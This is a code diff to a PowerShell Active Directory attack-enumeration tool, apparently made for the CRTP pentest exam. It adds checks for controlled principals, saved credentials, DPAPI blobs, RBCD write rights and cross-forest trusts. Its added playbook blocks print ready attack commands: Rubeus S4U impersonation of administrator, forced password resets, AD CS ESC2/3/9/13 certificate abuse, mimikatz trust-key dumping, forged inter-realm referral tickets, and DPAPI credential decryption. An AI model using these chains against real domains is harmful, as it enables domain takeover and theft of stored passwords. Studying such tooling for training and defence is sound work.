@@ -235,6 +235,16 @@ function Invoke-CRTPEnum {
         } catch {}
         $res
     }
+    # Is this ACE principal one we control (-OwnedPrincipals) or a broad low-priv group that
+    # effectively ANY domain user falls into? Used to surface *actionable* ACL/RBCD rights
+    # (the MGMTSRV path: a principal you hold has GenericWrite over a computer object).
+    function Owned($who){
+        if (-not $who){ return $false }
+        $w = "$who"
+        foreach($o in $OwnedPrincipals){ if ($o -and ($w -like "*$o*" -or ($w -split '\\')[-1] -ieq ($o -split '\\')[-1])){ return $true } }
+        if ($w -match 'Authenticated Users|\bEveryone\b|\\Domain Users|\\Users$'){ return $true }
+        return $false
+    }
 
     Log "============================================================" 'White'
     Log " CRTP Enumeration   Domain: $Domain" 'White'
@@ -263,6 +273,17 @@ function Invoke-CRTPEnum {
         $isAdmin = (New-Object Security.Principal.WindowsPrincipal($id)).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
         $out += "Local admin (elevated) : $isAdmin"
         if ($isAdmin){ Flag 'INFO' "Current process is elevated (local admin on $env:COMPUTERNAME)." }
+
+        # netonly / no-domain-context detection: a runas /netonly (LOGON_TYPE 9) shell has NO cached
+        # domain context, so serverless binds ([ADSI]'LDAP://RootDSE', PowerView/Certify without -Server,
+        # or 'Get-DomainObject' with no DC) fail with "domain could not be contacted" - exactly the
+        # dead-ends hit in the exam. Detect it and tell the operator to always pass -Server/-Domain/-dc.
+        $serverlessOK = $false
+        try { if ("$(([ADSI]'LDAP://RootDSE').defaultNamingContext)"){ $serverlessOK = $true } } catch {}
+        if ($adReachable -and -not $serverlessOK){
+            Flag 'MED' "No domain context (netonly/LOGON_TYPE 9 session). Serverless binds will fail - ALWAYS pass -Server <DC>/-Domain to AD-module & PowerView, and /dc:<DC> to Rubeus/Certify."
+            $out += "`n[!] netonly/no-domain-context detected: use -Server/-Domain/-dc on every domain query."
+        }
 
         # Token privileges worth abusing
         $privs = (whoami /priv) 2>$null
@@ -306,10 +327,41 @@ function Invoke-CRTPEnum {
         Save '00b_edr.txt' $out
     }
 
+    # ---------------- 00c SAVED CREDENTIALS (Credential Manager / DPAPI / cmdkey) ----------------
+    # Local, read-only. Finds saved RDP/credential-manager blobs (this is what recovered the
+    # studentuser RDP password post-exam). Does NOT decrypt - points you at the blob + the
+    # mimikatz dpapi command to crack it under your own user context.
+    if (RunS @('context','creds','dpapi','cmdkey')) {
+        Sect "Saved credentials (Credential Manager / DPAPI / cmdkey)"
+        $out = @()
+        try {
+            $ck = (cmdkey /list 2>$null | Out-String)
+            $out += "--- cmdkey /list ---`n$ck"
+            foreach($ln in ($ck -split "`r?`n" | Where-Object { $_ -match 'Target:\s*(\S+)' })){
+                $tgt = ($ln -replace '.*Target:\s*','').Trim()
+                $sev = if ($tgt -match 'TERMSRV|Domain:') { 'HIGH' } else { 'MED' }
+                Flag $sev "Saved credential present: $tgt (decrypt with mimikatz dpapi::cred under this user)"
+                AddExpl 'SavedCred' @{ Target=$tgt }
+            }
+            # DPAPI credential + vault blob files (encrypted; decrypt via sekurlsa::dpapi + dpapi::cred)
+            foreach($p in @("$env:LOCALAPPDATA\Microsoft\Credentials","$env:APPDATA\Microsoft\Credentials",
+                            "$env:LOCALAPPDATA\Microsoft\Vault","$env:APPDATA\Microsoft\Vault")){
+                if (Test-Path $p){
+                    $blobs = @(Get-ChildItem -LiteralPath $p -Force -Recurse -File -ErrorAction SilentlyContinue)
+                    foreach($b in $blobs){ $out += "BLOB $($b.FullName)  [$($b.Length)b]" }
+                    if ($blobs.Count){ Flag 'HIGH' "$($blobs.Count) DPAPI credential/vault blob(s) in $p -> mimikatz: sekurlsa::dpapi then dpapi::cred /in:<blob>"; AddExpl 'DPAPIBlob' @{ Path=$p; Count=$blobs.Count } }
+                }
+            }
+            if (-not $out){ $out += "No saved credentials found for this user." }
+        } catch { $out += "Error: $_" }
+        Save '00c_saved_creds.txt' $out
+    }
+
     # ---------------- 01 DOMAIN / FOREST / TRUSTS ----------------
     if (RunS @('domain','trust','forest')) {
     Sect "Domain, Forest & Trusts"
     $out = @()
+    $xforest = @()
     try {
         if ($useAD) {
             $dom = Get-ADDomain -Server $Domain
@@ -326,6 +378,7 @@ function Invoke-CRTPEnum {
             foreach($t in (Get-ADTrust -Filter * -Server $Domain)){
                 $sev = if (-not $t.IntraForest) { 'MED' } else { 'INFO' }
                 Flag $sev "Trust -> $($t.Name)  Dir=$($t.Direction)  IntraForest=$($t.IntraForest)  SIDFiltering=$($t.SIDFilteringForestAware)"
+                if (-not $t.IntraForest){ $xforest += "$($t.Name) (SIDFiltering=$($t.SIDFilteringForestAware))" }
             }
         } else {
             try { $g_domainSID = (New-Object System.Security.Principal.SecurityIdentifier(((DE "LDAP://$defaultNC").Properties['objectSid'][0]),0)).Value } catch {}
@@ -334,9 +387,17 @@ function Invoke-CRTPEnum {
             $out += "`n--- FOREST ---`n" + ($d.Forest | Format-List * | Out-String)
             $out += "`n--- TRUSTS ---`n" + ($d.GetAllTrustRelationships() | Format-List * | Out-String)
             foreach($t in $d.GetAllTrustRelationships()){ Flag 'MED' "Trust -> $($t.TargetName)  Dir=$($t.TrustDirection)" }
-            foreach($t in $d.Forest.GetAllTrustRelationships()){ Flag 'MED' "Forest trust -> $($t.TargetName)  Dir=$($t.TrustDirection)" }
+            foreach($t in $d.Forest.GetAllTrustRelationships()){ Flag 'MED' "Forest trust -> $($t.TargetName)  Dir=$($t.TrustDirection)"; $xforest += "$($t.TargetName) (forest trust)" }
         }
     } catch { $out += "Error: $_" }
+    # Cross-forest playbook: when an inter-forest trust exists, once you are DA in THIS forest the
+    # trust key enables a cross-forest referral ticket. With SID filtering ON (the exam case) that
+    # only yields LOW-PRIV access - so pivot to hunting a leaked cert/key on the other forest's
+    # readable shares (the FINANCE-DC -> finadmin.pem path) and PKINIT with it.
+    if ($xforest){
+        Flag 'INFO' "Cross-forest trust(s): $($xforest -join '; '). After DA here: DCSync the trust account -> forge a referral ticket -> if SID filtering blocks privileged access, hunt certs/keys on the other forest's shares (see 12b) -> PKINIT."
+        AddExpl 'CrossForestTrust' @{ Trusts=($xforest -join '; ') }
+    }
     Save '01_domain_trusts.txt' $out
     }
 
@@ -458,6 +519,30 @@ function Invoke-CRTPEnum {
                 else { Flag 'INFO' "ms-DS-MachineAccountQuota = 0 (cannot add computer objects)" }
             }
         } catch {}
+
+        # RBCD ATTACK *AVAILABLE* (not just already-configured): a principal you control, or a broad
+        # low-priv group, has WRITE rights over a computer object -> YOU can set
+        # msDS-AllowedToActOnBehalfOfOtherIdentity and S4U as a DA. This is the MGMTSRV path
+        # (studvm$ GenericWrite -> mgmtsrv) that pure "is RBCD set?" checks miss.
+        if (-not $Quick) {
+            $compDNs = @()
+            foreach($r in (LDAP '(objectCategory=computer)' @('distinguishedname','dnshostname'))){
+                $cn = PV $r 'dnshostname'; $cdn = PV $r 'distinguishedname'
+                if (-not $cdn){ continue }
+                if ($Target -and -not (@($Target | Where-Object { $cn -like "*$_*" -or $cdn -like "*$_*" }).Count)){ continue }
+                $compDNs += [pscustomobject]@{ N=$cn; DN=$cdn }
+            }
+            # Bound the DACL reads on large domains unless scoped/owned-aware
+            if (-not ($Target -or $OwnedPrincipals.Count -or $doHostSweep)){ $compDNs = $compDNs | Select-Object -First 200 }
+            foreach($cc in $compDNs){
+                foreach($ace in (WriteAces $cc.DN)){
+                    if (Owned $ace.Who){
+                        Flag 'HIGH' "RBCD ATTACK available on $($cc.N): '$($ace.Who)' (you control / low-priv) has $($ace.Rights) -> set RBCD then S4U as a DA"
+                        AddExpl 'RBCDWrite' @{ Host=$cc.N; Via=$ace.Who }
+                    }
+                }
+            }
+        }
     } catch { $out += "Error: $_" }
     Save '03_computers.txt' $out
     }
@@ -779,11 +864,31 @@ function Invoke-CRTPEnum {
         try {
             if ($havePVA) {
                 $acls = Find-InterestingDomainAcl -ResolveGUIDs -Domain $Domain
-                foreach($a in $acls){ Flag 'HIGH' "ACL: $($a.IdentityReferenceName) has $($a.ActiveDirectoryRights) over $($a.ObjectDN)" }
+                foreach($a in $acls){
+                    if (Owned $a.IdentityReferenceName){
+                        Flag 'HIGH' "ACL [YOU CONTROL]: $($a.IdentityReferenceName) has $($a.ActiveDirectoryRights) over $($a.ObjectDN) -> directly actionable"
+                        AddExpl 'OwnedACL' @{ Who=$a.IdentityReferenceName; Rights=$a.ActiveDirectoryRights; Target=$a.ObjectDN }
+                    } else {
+                        Flag 'HIGH' "ACL: $($a.IdentityReferenceName) has $($a.ActiveDirectoryRights) over $($a.ObjectDN)"
+                    }
+                }
                 $out += ($acls | Select-Object IdentityReferenceName,ActiveDirectoryRights,ObjectDN | Format-Table -Auto | Out-String)
             } else {
                 $out += "PowerView Find-InterestingDomainAcl not loaded. Dot-source PowerView first, or run SharpHound -> BloodHound for full ACL attack paths."
                 Flag 'INFO' "For ACL attack paths: load PowerView (Find-InterestingDomainAcl -ResolveGUIDs) or run BloodHound."
+                # Fallback (no PowerView): when -OwnedPrincipals is set, scan user/group DACLs for rights
+                # held by a principal you control (surfaces the AddSelf/ForceChangePassword/GenericWrite chain).
+                if ($OwnedPrincipals.Count){
+                    foreach($r in (LDAP '(|(objectCategory=user)(objectCategory=group))' @('distinguishedname','samaccountname'))){
+                        $odn = PV $r 'distinguishedname'; if (-not $odn){ continue }
+                        foreach($ace in (WriteAces $odn)){
+                            if (Owned $ace.Who){
+                                Flag 'HIGH' "ACL [YOU CONTROL]: $($ace.Who) has $($ace.Rights) over $(PV $r 'samaccountname') -> directly actionable"
+                                AddExpl 'OwnedACL' @{ Who=$ace.Who; Rights=$ace.Rights; Target=(PV $r 'samaccountname') }
+                            }
+                        }
+                    }
+                }
             }
         } catch { $out += "Error: $_" }
         Save '07_acls.txt' $out
@@ -1319,6 +1424,8 @@ function Invoke-CRTPEnum {
         @{t='DCSync';                     why='DCSync rights -> dump krbtgt -> golden ticket = full domain'},
         @{t='ShareSecretFile';            why='private key / credential file on a readable share -> PKINIT / direct auth'},
         @{t='ShareSecret';                why='credential/secret in a readable share file -> use it directly'},
+        @{t='RBCDWrite';                  why='you can WRITE a computer object -> configure RBCD & S4U as a Domain Admin'},
+        @{t='OwnedACL';                   why='a principal you control has a dangerous ACL -> take over the target object'},
         @{t='ESC3Target';                 why='AD CS ESC3 -> enroll an agent cert, then request a cert ON-BEHALF-OF a Domain Admin -> DA'},
         @{t='ESC3Agent';                  why='AD CS ESC3 (agent template enrollable) -> pair with an ESC3 TARGET template to impersonate a DA'},
         @{t='ESC13';                      why='AD CS ESC13 -> issuance policy links to a privileged group -> enroll to inherit it'},
@@ -1328,6 +1435,8 @@ function Invoke-CRTPEnum {
         @{t='LAPS';                       why='readable LAPS password -> local admin right now'},
         @{t='GMSA';                       why='readable gMSA -> use its NTLM (overpass-the-hash)'},
         @{t='GPP';                        why='GPP cpassword -> decrypt a stored credential'},
+        @{t='SavedCred';                  why='saved credential (RDP/cmdkey) -> decrypt via DPAPI (mimikatz dpapi::cred)'},
+        @{t='DPAPIBlob';                  why='DPAPI credential blobs present -> decrypt saved secrets under your user'},
         @{t='DumpTarget';                 why='you are admin where a privileged user is logged on -> dump their creds'},
         @{t='UnconstrainedHost';          why='unconstrained delegation -> coerce a DC and steal its TGT'},
         @{t='ConstrainedHost';            why='constrained delegation (host) -> impersonate administrator'},
@@ -1336,6 +1445,7 @@ function Invoke-CRTPEnum {
         @{t='Kerberoast';                 why='kerberoast -> crack a service account (do any PRIVILEGED ones first)'},
         @{t='ASREP';                      why='AS-REP roast -> crack the account offline'},
         @{t='MAQ';                        why='MachineAccountQuota>0 -> add a machine account for RBCD'},
+        @{t='CrossForestTrust';           why='inter-forest trust -> after DA, referral ticket + leaked-cert PKINIT into the other forest'},
         @{t='Priv_SeImpersonatePrivilege';why='SeImpersonate -> local SYSTEM on this host'},
         @{t='Priv_SeDebugPrivilege';      why='SeDebug -> dump LSASS'},
         @{t='Priv_SeBackupPrivilege';     why='SeBackup -> read SAM / NTDS.dit'}
@@ -1344,7 +1454,7 @@ function Invoke-CRTPEnum {
     foreach($p in $prio){
         $hit = $expl | Where-Object { $_.Type -eq $p.t } | Select-Object -First 1
         if ($hit){
-            $tgt = @($hit.Data.User,$hit.Data.Host,$hit.Data.Template,$hit.Data.Principal,$hit.Data.Instance,$hit.Data.Account) | Where-Object { $_ } | Select-Object -First 1
+            $tgt = @($hit.Data.User,$hit.Data.Host,$hit.Data.Template,$hit.Data.Principal,$hit.Data.Instance,$hit.Data.Account,$hit.Data.Target,$hit.Data.File,$hit.Data.Trusts) | Where-Object { $_ } | Select-Object -First 1
             $nextMove = "RECOMMENDED NEXT MOVE: $($p.why)" + $(if($tgt){"  [target: $tgt]"}else{''})
             break
         }
@@ -1559,6 +1669,106 @@ function Invoke-CRTPEnum {
                     default    { $c += "       $($d.Abuse)" }
                 }
                 $c += "     NEXT: SYSTEM on the DC / Domain Admin."
+            }
+            'RBCDWrite' {
+                $c += "`n[$ei] RBCD ATTACK AVAILABLE  ->  $($d.Host)  (writer you control: $($d.Via))"
+                $c += "     GOAL: you can WRITE this computer object -> configure RBCD -> impersonate a DA to it."
+                $c += "     RUN  (from a context that holds '$($d.Via)'):"
+                $c += "       # 1) point the target's RBCD at an account whose key you have (e.g. a machine acct):"
+                $c += "       Set-ADComputer $($d.Host) -PrincipalsAllowedToDelegateToAccount <controlled-acct>`$ -Server <DC-FQDN>"
+                $c += "       # 2) S4U as a Domain Admin to the target's cifs service:"
+                $c += "       Rubeus.exe s4u /user:<controlled-acct>`$ /rc4:<NTLM> /impersonateuser:administrator /msdsspn:cifs/$($d.Host) /ptt"
+                $c += "     NEXT: access \\$($d.Host)\c`$ as administrator (clear the attribute afterwards)."
+            }
+            'OwnedACL' {
+                $c += "`n[$ei] ACL YOU CONTROL  ->  $($d.Who) has $($d.Rights) over $($d.Target)"
+                $c += "     GOAL: abuse the write right to take over $($d.Target)."
+                $c += "     RUN  (pick per right):"
+                $c += "       # ForceChangePassword:  Set-ADAccountPassword -Identity $($d.Target) -Reset -NewPassword (ConvertTo-SecureString 'Pwd123!xYz' -AsPlainText -Force) -Server <DC-FQDN>"
+                $c += "       # AddSelf/Member (group): Add-ADGroupMember -Identity $($d.Target) -Members <you> -Server <DC-FQDN>"
+                $c += "       # GenericAll/WriteDacl (computer): set RBCD (see RBCD block); (user): set an SPN -> kerberoast, or reset pwd."
+                $c += "     NEXT: re-request a TGT so new membership/rights apply, then use the account."
+            }
+            'ShareSecretFile' {
+                $c += "`n[$ei] PRIVATE KEY / CRED FILE ON SHARE  ->  $($d.File)"
+                $c += "     GOAL: a .pem/.pfx/.key on a readable share often = direct auth (PKINIT) as its owner."
+                $c += "     RUN :"
+                $c += "       copy `"$($d.File)`" .\leaked ; # if PEM: openssl pkcs12 -in leaked.pem -keyex -export -out leaked.pfx -passout pass:<pfxpass>"
+                $c += "       Rubeus.exe asktgt /user:<owner> /certificate:leaked.pfx /password:<pfxpass> /domain:<their-domain> /dc:<their-DC> /ptt"
+                $c += "     NEXT: you hold a TGT as the cert owner (bypasses SID filtering cross-forest)."
+            }
+            'ShareSecret' {
+                $c += "`n[$ei] SECRET IN SHARE FILE  ->  $($d.File)"
+                $c += "     GOAL: use the plaintext/credential found in this file directly."
+                $c += "     RUN :"
+                $c += "       type `"$($d.File)`"      # read the full credential/context"
+                $c += "       Rubeus.exe asktgt /user:<user> /password:<pwd> /domain:$dom /dc:<DC-FQDN> /ptt   # or runas /netonly"
+                $c += "     NEXT: authenticate as that account."
+            }
+            'ESC3Agent' {
+                $c += "`n[$ei] AD CS ESC3 (agent template)  ->  template: $($d.Template)   enrollable by: $($d.Enroll)"
+                $c += "     GOAL: enrol an ENROLLMENT AGENT cert; pair it with an ESC3 TARGET template to impersonate a DA."
+                $c += "     RUN :"
+                $c += "       Certify.exe request /ca:<DC-FQDN>\<CA-name> /template:$($d.Template)    # -> agent.pem"
+                $c += "       openssl pkcs12 -in agent.pem -keyex -CSP `"Microsoft Enhanced Cryptographic Provider v1.0`" -export -out agent.pfx -passout pass:<pfxpass>"
+                $c += "     NEXT: use agent.pfx in the ESC3 TARGET block (/onbehalfof)."
+            }
+            'ESC3Target' {
+                $c += "`n[$ei] AD CS ESC3 (on-behalf-of)  ->  template: $($d.Template)   enrollable by: $($d.Enroll)"
+                $c += "     GOAL: use an enrollment-agent cert to request a cert AS a Domain Admin -> PKINIT -> DA."
+                $c += "     RUN :"
+                $c += "       Certify.exe request /ca:<DC-FQDN>\<CA-name> /template:$($d.Template) /onbehalfof:$shortDom\administrator /enrollcert:agent.pfx /enrollcertpw:<pfxpass>"
+                $c += "       openssl pkcs12 -in cert.pem -keyex -export -out admin.pfx -passout pass:<pfxpass>"
+                $c += "       Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /password:<pfxpass> /domain:$dom /dc:<DC-FQDN> /ptt"
+                $c += "     NEXT: you hold a TGT as a Domain Admin (no password/hash needed)."
+            }
+            'ESC2' {
+                $c += "`n[$ei] AD CS ESC2 (any-purpose / SubCA)  ->  template: $($d.Template)   enrollable by: $($d.Enroll)"
+                $c += "     GOAL: an any-purpose cert can be used as an enrollment agent (-> ESC3) or for client auth."
+                $c += "     RUN :"
+                $c += "       Certify.exe request /ca:<DC-FQDN>\<CA-name> /template:$($d.Template)"
+                $c += "     NEXT: use it as the agent cert in an ESC3 on-behalf-of request."
+            }
+            'ESC9' {
+                $c += "`n[$ei] AD CS ESC9 (no security extension)  ->  template: $($d.Template)   enrollable by: $($d.Enroll)"
+                $c += "     GOAL: weak cert->account mapping; combine with a controlled account's UPN to authenticate as a victim."
+                $c += "     RUN :  (set controlled user's UPN = victim, enrol, restore, then PKINIT)"
+                $c += "       Certify.exe request /ca:<DC-FQDN>\<CA-name> /template:$($d.Template)"
+                $c += "     NEXT: PKINIT with the issued cert as the mapped victim."
+            }
+            'ESC13' {
+                $c += "`n[$ei] AD CS ESC13 (issuance policy -> group)  ->  template: $($d.Template)   enrollable by: $($d.Enroll)"
+                $c += "     GOAL: the template's issuance policy is linked (msDS-OIDToGroupLink) to a privileged group;"
+                $c += "           enrolling grants that group membership in your PAC."
+                $c += "       Certify.exe request /ca:<DC-FQDN>\<CA-name> /template:$($d.Template)"
+                $c += "     NEXT: PKINIT with the cert -> your token now carries the linked group."
+            }
+            'CrossForestTrust' {
+                $c += "`n[$ei] CROSS-FOREST TRUST  ->  $($d.Trusts)"
+                $c += "     GOAL: after DA in THIS forest, reach the trusted forest."
+                $c += "     RUN :"
+                $c += "       # 1) get the trust key:  SafetyKatz 'lsadump::trust /patch'   (or dcsync the <OTHERFOREST>`$ account)"
+                $c += "       # 2) forge an inter-realm referral ticket:"
+                $c += "       mimikatz 'kerberos::golden /user:administrator /domain:$dom /sid:$sid /rc4:<trustkey> /service:krbtgt /target:<other.forest> /ticket:referral.kirbi'"
+                $c += "       # 3) ask for a service ticket in the other forest:"
+                $c += "       Rubeus.exe asktgs /service:cifs/<other-DC> /ticket:referral.kirbi /dc:<other-DC> /ptt"
+                $c += "     NEXT: SID filtering usually limits this to LOW-PRIV read -> hunt a leaked cert/key on the"
+                $c += "           other forest's shares (12b) and PKINIT with it to become their DA."
+            }
+            'SavedCred' {
+                $c += "`n[$ei] SAVED CREDENTIAL  ->  $($d.Target)"
+                $c += "     GOAL: recover a stored credential (e.g. RDP 'remember me') from Credential Manager."
+                $c += "     RUN  (mimikatz, as THIS user):"
+                $c += "       privilege::debug ; sekurlsa::dpapi ; dpapi::cred /in:%localappdata%\Microsoft\Credentials\<blob>"
+                $c += "     NEXT: the decrypted CredentialBlob is the plaintext password for $($d.Target)."
+            }
+            'DPAPIBlob' {
+                $c += "`n[$ei] DPAPI CREDENTIAL BLOBS  ->  $($d.Count) in $($d.Path)"
+                $c += "     GOAL: decrypt saved credentials/vault blobs under your own user context."
+                $c += "     RUN  (mimikatz):"
+                $c += "       privilege::debug ; token::elevate ; sekurlsa::dpapi      # caches your masterkeys"
+                $c += "       dpapi::cred /in:$($d.Path)\<blob>                         # repeat per blob"
+                $c += "     NEXT: read the CredentialBlob field for each decrypted secret."
             }
             default { }
         }
@@ -1989,7 +2199,8 @@ tr.hi{background:#2d1416}tr:hover{background:#161b22}
         $desc = @{
             '00_context'          = 'Your token: privileges (SeImpersonate/SeBackup/SeDebug), group membership'
             '00b_edr'             = 'Defensive products (AV/EDR) detected on this host'
-            '01_domain_trusts'    = 'Domain, forest, DCs, trusts + SID filtering'
+            '00c_saved_creds'     = 'Saved creds (Credential Manager/cmdkey) + DPAPI blobs -> dpapi::cred'
+            '01_domain_trusts'    = 'Domain, forest, DCs, trusts + SID filtering + cross-forest playbook'
             '02_users'            = 'Users; see 02a kerberoastable, 02b adminCount'
             '02a_kerberoastable'  = 'Users with SPNs (Kerberoast targets)'
             '02b_admincount'      = 'adminCount=1 (protected/privileged) users'
